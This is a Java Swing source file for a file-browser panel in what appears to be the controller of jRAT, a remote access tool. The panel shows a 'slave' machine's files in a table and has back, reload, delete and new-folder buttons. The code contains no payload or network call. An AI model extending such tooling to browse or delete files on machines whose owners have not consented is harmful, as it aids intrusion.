package jrat.module.fs.ui;

import jrat.api.Resources;
import jrat.controller.AbstractSlave;
import jrat.controller.io.FileObject;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.components.TableModel;
import jrat.controller.ui.renderers.JComboBoxIconRenderer;
import jrat.controller.utils.Utils;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.File;

@SuppressWarnings("serial")
public abstract class FileTable extends JPanel implements PathComponent.DirectorySelectListener {

	protected JToolBar toolBar;
	protected JTable table;
	public FileViewTableRenderer tableRenderer;
	private TableModel tableModel;
	
	protected JComboBox driveComboBox;
	protected DefaultComboBoxModel driveComboModel;
	protected JComboBoxIconRenderer renderer;

	private PathComponent path;
	private String currentDirectory;
	
	public FileTable() {
		this(null);
	}
	
	public FileTable(AbstractSlave slave) {
		setLayout(new BorderLayout(0, 0));
		
		toolBar = new JToolBar();
		toolBar.setFloatable(false);
		add(toolBar, BorderLayout.NORTH);
		
		tableRenderer = new FileViewTableRenderer(slave);
		
		this.tableModel = new TableModel(new Object[] { "File name", "File size", "Last modified", "Hidden" });
		
		JScrollPane sp = new JScrollPane();
		table = new DefaultJTable(getTableModel());
		table.setRowHeight(22);
		table.setDefaultRenderer(Object.class, tableRenderer);
		table.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				if (e.getClickCount() == 2 && table.getSelectedRow() != -1) {
					FileObject fo = getSelectedItem();
					onItemClick(fo);
				}
			}
		});
		sp.setViewportView(table);
		sp.setBorder(null);
		add(sp, BorderLayout.CENTER);
		
		JButton btnBack = new JButton("");
		toolBar.add(btnBack);
		btnBack.setToolTipText("Back");
		btnBack.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				onBack();
			}
		});
		btnBack.setIcon(Resources.getIcon("arrow-left"));
		
		JButton btnRefresh = new JButton("");
		toolBar.add(btnRefresh);
		btnRefresh.setToolTipText("Reload");
		btnRefresh.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				onReload();
			}
		});
		btnRefresh.setIcon(Resources.getIcon("refresh"));
		
		JButton btnDelete = new JButton("");
		toolBar.add(btnDelete);
		btnDelete.setToolTipText("Delete");
		btnDelete.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				onDelete();
			}
		});
		btnDelete.setIcon(Resources.getIcon("delete"));
		
		JButton btnNewFolder = new JButton("");
		btnNewFolder.setToolTipText("New Folder");
		btnNewFolder.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				onCreateFolder();
			}
		});
		btnNewFolder.setIcon(Resources.getIcon("folder-add"));
		toolBar.add(btnNewFolder);
		
		driveComboBox = new JComboBox<String>();
		driveComboBox.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				
			}
		});
		driveComboModel = (DefaultComboBoxModel<String>) driveComboBox.getModel();
		renderer = new JComboBoxIconRenderer();
		
		toolBar.add(driveComboBox);
		
		path = new PathComponent(slave != null ? slave.getFileSeparator() : File.separator + "");
		path.addListener(this);
		toolBar.add(path);
	}
	
	public FileObject[] getSelectedItems() {
		FileObject[] rows = new FileObject[table.getSelectedRowCount()];
		
		int pos = 0;
		for (int i : table.getSelectedRows()) {
			rows[pos++] = (FileObject) table.getValueAt(i, 0);
		}

		return rows;
	}
	
	public FileObject getSelectedItem() {
		int i = table.getSelectedRow();
		
		return (FileObject) table.getValueAt(i, 0);
	}

    public abstract void onBack();
	
	public abstract void onReload();
	
	public abstract void onDelete();
	
	public abstract void onCreateFolder();
	
	public abstract void onItemClick(FileObject fo);
	
	public void setDirectory(String directory) {
		currentDirectory = directory;
	    path.setDirectory(directory);
	}

	public String getCurrentDirectory() {
		return currentDirectory;
	}
	
	public void clear() {
		while (getTableModel().getRowCount() > 0) {
			getTableModel().removeRow(0);
		}
	}
	
	public void addPopup(JPopupMenu menu) {
		Utils.addPopup(table, menu);
	}
	
	public void addFileObject(FileObject fo) {
		getTableModel().addRow(new Object[] { fo });
	}

	public TableModel getTableModel() {
		return tableModel;
	}
}
